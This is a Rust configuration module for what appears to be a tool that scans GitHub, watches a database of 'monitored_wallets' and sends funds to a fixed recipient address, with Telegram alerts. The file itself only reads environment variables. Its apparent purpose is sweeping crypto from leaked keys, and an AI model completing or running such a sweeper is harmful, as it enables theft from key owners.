use std::env;
use thiserror::Error;

#[derive(Debug, Clone)]
pub struct Config {
    // GitHub
    pub github_token: Option<String>,
    pub github_api_url: String,
    
    // Telegram
    pub telegram_bot_token: String,
    pub telegram_chat_id: String,
    
    // MongoDB
    pub mongodb_uri: String,
    pub mongodb_db: String,
    pub mongodb_collection: String,
    
    // Recipient Wallet
    pub recipient_address: String,
    
    // Network
    pub rpc_url: String,
    pub chain_id: u64,
    
    // Scanner Settings
    pub poll_interval_secs: u64,
    pub min_balance_threshold: f64,
    pub gas_limit: u64,
    pub gas_price_gwei: u64,
}

#[derive(Debug, Error)]
pub enum ConfigError {
    #[error("Missing required environment variable: {0}")]
    MissingEnv(String),
    
    #[error("Invalid value for environment variable {0}: {1}")]
    InvalidValue(String, String),
}

impl Config {
    pub fn from_env() -> Result<Self, ConfigError> {
        Ok(Self {
            // GitHub
            github_token: env::var("GITHUB_TOKEN").ok(),
            github_api_url: env::var("GITHUB_API_URL")
                .unwrap_or_else(|_| "https://api.github.com".to_string()),
            
            // Telegram
            telegram_bot_token: env::var("TELEGRAM_BOT_TOKEN")
                .map_err(|_| ConfigError::MissingEnv("TELEGRAM_BOT_TOKEN".to_string()))?,
            telegram_chat_id: env::var("TELEGRAM_CHAT_ID")
                .map_err(|_| ConfigError::MissingEnv("TELEGRAM_CHAT_ID".to_string()))?,
            
            // MongoDB
            mongodb_uri: env::var("MONGODB_URI")
                .unwrap_or_else(|_| "mongodb://localhost:27017".to_string()),
            mongodb_db: env::var("MONGODB_DB")
                .unwrap_or_else(|_| "git_scanner".to_string()),
            mongodb_collection: env::var("MONGODB_COLLECTION")
                .unwrap_or_else(|_| "monitored_wallets".to_string()),
            
            // Recipient Wallet
            recipient_address: env::var("RECIPIENT_ADDRESS")
                .map_err(|_| ConfigError::MissingEnv("RECIPIENT_ADDRESS".to_string()))?,
            
            // Network
            rpc_url: env::var("RPC_URL")
                .map_err(|_| ConfigError::MissingEnv("RPC_URL".to_string()))?,
            chain_id: env::var("CHAIN_ID")
                .unwrap_or_else(|_| "1".to_string())
                .parse()
                .map_err(|e| ConfigError::InvalidValue("CHAIN_ID".to_string(), e.to_string()))?,
            
            // Scanner Settings
            poll_interval_secs: env::var("POLL_INTERVAL_SECONDS")
                .unwrap_or_else(|_| "3".to_string())
                .parse()
                .map_err(|e| ConfigError::InvalidValue("POLL_INTERVAL_SECONDS".to_string(), e.to_string()))?,
            min_balance_threshold: env::var("MIN_BALANCE_THRESHOLD")
                .unwrap_or_else(|_| "0.0001".to_string())
                .parse()
                .map_err(|e| ConfigError::InvalidValue("MIN_BALANCE_THRESHOLD".to_string(), e.to_string()))?,
            gas_limit: env::var("GAS_LIMIT")
                .unwrap_or_else(|_| "21000".to_string())
                .parse()
                .map_err(|e| ConfigError::InvalidValue("GAS_LIMIT".to_string(), e.to_string()))?,
            gas_price_gwei: env::var("GAS_PRICE_GWEI")
                .unwrap_or_else(|_| "50".to_string())
                .parse()
                .map_err(|e| ConfigError::InvalidValue("GAS_PRICE_GWEI".to_string(), e.to_string()))?,
        })
    }
}